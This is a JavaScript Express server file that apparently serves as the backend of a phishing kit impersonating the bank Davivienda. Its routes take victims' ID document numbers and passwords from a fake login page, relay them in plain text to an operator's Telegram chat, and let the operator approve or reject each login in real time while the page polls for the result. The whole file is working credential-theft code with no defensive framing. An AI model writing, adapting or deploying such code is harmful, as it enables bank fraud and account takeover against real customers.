const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// --- VARIABLES DE ENTORNO ---
const FRONTEND_URL = process.env.FRONTEND_URL;
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!FRONTEND_URL || !TELEGRAM_TOKEN || !CHAT_ID) {
    console.error('❌ ERROR: Faltan variables de entorno (FRONTEND_URL, TELEGRAM_TOKEN, CHAT_ID)');
    process.exit(1);
}

// --- CORS ---
app.use(cors({
    origin: FRONTEND_URL,
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

const solicitudesPendientes = {};

// --- RUTA 1: Recibir datos del Frontend ---
app.post('/api/solicitar-acceso', async (req, res) => {
    const { documento, clave } = req.body;

    if (!documento || !clave) {
        return res.status(400).json({ error: 'Faltan datos' });
    }

    const requestId = Date.now().toString();
    solicitudesPendientes[requestId] = { estado: 'pendiente', documento, clave };

    const mensaje = `
🔔 *NUEVO INGRESO - DAVIVIENDA*
📄 *Documento:* ${documento}
🔑 *Clave:* ${clave}
🆔 *ID:* ${requestId}
⏳ *Estado:* Pendiente
    `;

    const keyboard = {
        inline_keyboard: [
            [
                { text: '✅ APROBAR', callback_data: `aprobar_${requestId}` },
                { text: '❌ RECHAZAR', callback_data: `rechazar_${requestId}` }
            ]
        ]
    };

    try {
        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: mensaje,
                parse_mode: 'Markdown',
                reply_markup: keyboard
            }
        );

        solicitudesPendientes[requestId].messageId = telegramResponse.data.result.message_id;
        solicitudesPendientes[requestId].chatId = CHAT_ID;

        res.json({ requestId });

    } catch (error) {
        console.error('Error enviando a Telegram:', error.response?.data || error.message);
        res.status(500).json({ error: 'Error interno del servidor' });
    }
});

// --- RUTA 2: Consultar estado (Polling) ---
app.get('/api/estado/:requestId', (req, res) => {
    const { requestId } = req.params;
    const solicitud = solicitudesPendientes[requestId];

    if (!solicitud) {
        return res.status(404).json({ error: 'Solicitud no encontrada' });
    }

    res.json({ estado: solicitud.estado });
});

// --- RUTA 3: Webhook de Telegram ---
app.post('/api/telegram-webhook', async (req, res) => {
    const { callback_query } = req.body;

    if (callback_query) {
        const data = callback_query.data;
        const [accion, requestId] = data.split('_');

        const usuario = callback_query.from;
        const nombreUsuario = usuario.first_name + (usuario.last_name ? ' ' + usuario.last_name : '');
        const username = usuario.username ? `@${usuario.username}` : 'sin username';
        const userId = usuario.id;
        const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });

        if (solicitudesPendientes[requestId]) {
            const solicitud = solicitudesPendientes[requestId];

            if (solicitud.estado !== 'pendiente') {
                await axios.post(
                    `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`,
                    {
                        callback_query_id: callback_query.id,
                        text: '⚠️ Esta solicitud ya fue procesada.'
                    }
                ).catch(err => console.error('Error:', err.message));
                return res.sendStatus(200);
            }

            if (accion === 'aprobar') solicitud.estado = 'aprobado';
            else if (accion === 'rechazar') solicitud.estado = 'rechazado';

            const estadoTexto = accion === 'aprobar' ? '✅ APROBADO' : '❌ RECHAZADO';

            const mensajeActualizado = `
🔔 *NUEVO INGRESO - DAVIVIENDA*
📄 *Documento:* ${solicitud.documento}
🔑 *Clave:* ${solicitud.clave}
🆔 *ID:* ${requestId}

${estadoTexto}
👤 *Por:* ${nombreUsuario} (${username})
🆔 *User ID:* ${userId}
🕒 *Fecha:* ${fecha}
            `;

            try {
                await axios.post(
                    `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`,
                    {
                        chat_id: solicitud.chatId,
                        message_id: solicitud.messageId,
                        text: mensajeActualizado,
                        parse_mode: 'Markdown',
                        reply_markup: { inline_keyboard: [] }
                    }
                );

                await axios.post(
                    `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`,
                    {
                        callback_query_id: callback_query.id,
                        text: `Solicitud ${accion} por ${nombreUsuario}`
                    }
                );

            } catch (error) {
                console.error('Error editando mensaje:', error.response?.data || error.message);
            }
        } else {
            await axios.post(
                `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`,
                {
                    callback_query_id: callback_query.id,
                    text: '⚠️ Solicitud no encontrada o expirada.'
                }
            ).catch(err => console.error('Error:', err.message));
        }
    }
    res.sendStatus(200);
});

// Ruta de prueba
app.get('/', (req, res) => {
    res.send('Backend Davivienda funcionando correctamente.');
});

app.listen(PORT, () => {
    console.log(`✅ Servidor Backend corriendo en el puerto ${PORT}`);
    console.log(`🌐 Frontend permitido: ${FRONTEND_URL}`);
});
